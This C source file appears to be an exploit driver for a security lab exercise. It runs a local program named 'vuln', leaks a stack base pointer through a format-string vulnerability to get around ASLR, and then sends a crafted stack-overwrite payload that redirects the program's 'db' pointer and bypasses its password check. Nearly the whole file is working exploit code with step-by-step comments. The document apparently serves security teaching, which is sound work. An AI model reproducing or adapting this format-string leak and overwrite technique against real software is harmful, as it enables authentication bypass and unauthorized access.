#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdint.h>
#include <errno.h>

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;

   // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
   // to figure out and populate the following values
   uint64_t auth_bp =         0x7ffc8b4ee5a0; // rbp value in auth
   uint64_t auth_cred_loc =   0x7ffc8b4ee590; // loc of cred 
   uint64_t auth_db_loc =     0x7ffc8b4ee588; // loc of db (local var of auth)
   uint64_t auth_cred     =   0x7ffc8b4ee4a0; // value of cred (after alloca)
   
   // The above values discovered using GDB will vary across the runs, but the
   // differences between similar variables are preserved, so we compute those.
   uint64_t auth_bp_cred_loc_dist  = auth_cred_loc - auth_bp;
   uint64_t auth_db_cred_dist      = auth_db_loc - auth_cred;

   // During exploit, the above distances are not enough. We also need to know
   // the location of auth's bp, which will vary from one run to another due
   // to ASLR. We will use the format string vulnerability to probe this 
   // value dynamically. Because of the location of format string vulnerability,
   // we cannot probe auth's bp, so we have to compute it from mainloop's 
   // saved bp, which is the same as main's base pointer. 
   // So, use GDB to probe mainloop's saved rbp in your sample run
   uint64_t main_bp = 0x7ffc8b4eece0; // saved rbp value in mainloop
   uint64_t auth_main_bp_dist = auth_bp - main_bp;
   // Use GDB + trial&error to figure out the correct offsets where mainloop's
   // saved RBP is stored. You will need to set a breakpoint just before the
   // call to printf and probe stack memory. You may have to search hundreds to
   // a few thousands of bytes before you find the right location. Once you find
   // the location, find the right number to use in the following format string
   // in order to reveal the contents of that location.
   
   create_subproc("./vuln", nargv);
   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");
   getchar();
   get_formatted("%*s"); //Needed to clear out the Welcome message


   // If you are getting tired of all the probing, you can probe a bunch of 
   // locations in a loop. Uncomment this code and adjust the range for j.
   /*char s[64];
   for (int j= 200; j < 500; j++) {
      sprintf(s, "e %%%d$p\n", j);
      put_str(s);
      send();
      uint64_t extr;
      get_formatted("%p", &extr);
      fprintf(stderr, "Extr %lx\n", extr);
   }*/
   
   put_str("e %218$p\n");
   send();
   uint64_t cur_main_bp;
   get_formatted("%p", &cur_main_bp);
   fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);

   // Now, compute the information for the current run using the probed values
   uint64_t cur_auth_bp = cur_main_bp + auth_main_bp_dist;
   uint64_t cur_auth_cred_loc = cur_auth_bp + auth_bp_cred_loc_dist;
   fprintf(stderr, "driver: Computed cur_auth_bp=%lx, cur_auth_cred_loc=%lx\n", 
           cur_auth_bp, cur_auth_cred_loc);

   // Now, send the payload
   put_str("p 1234567\n");
   send();
   get_formatted("%*s");

   // Allocate and prepare a buffer that contains the exploit string.
   // The exploit starts at auth's cred, and should go until auth's db, so
   // allocate an exploit buffer of the required size. (Note that you need
   // additional 8 bytes to overwrite db, minus 8 bytes that will be used
   // to store the password we just sent, plus the '_' character.)
   
   unsigned explsz = auth_db_cred_dist + 8 - 8;
   void* *expl = (void**)malloc(explsz);

   // Initialize the buffer with '\1' to make the contents predictable.
   // We use 1 rather than 0 because we are overwriting the location on
   // the stack where the parameters of auth are stored. If either plen
   // or ulen becomes zero then password checking won't even be attempted,
   // so our exploit will fail. 
   memset((void*)expl, '\1', explsz);

   // Now initialize the parts of the exploit buffer that really matter. Note
   // that we don't have to worry about endianness as long as the exploit is
   // being assembled on the same architecture/OS as the process being
   // exploited. Also note that the -1 in indices comes from the fact that the
   // expl starts at index 1 in cred. (Index 0 stores the password.)

   expl[auth_db_cred_dist/sizeof(void*)-1] = (void*)cur_auth_cred_loc;
   
   put_str("u ");
   put_bin((char*)expl, explsz);
   put_str("\n");
   send();
   get_formatted("%*s");
   put_str("l \n");
   send();

   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);

   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
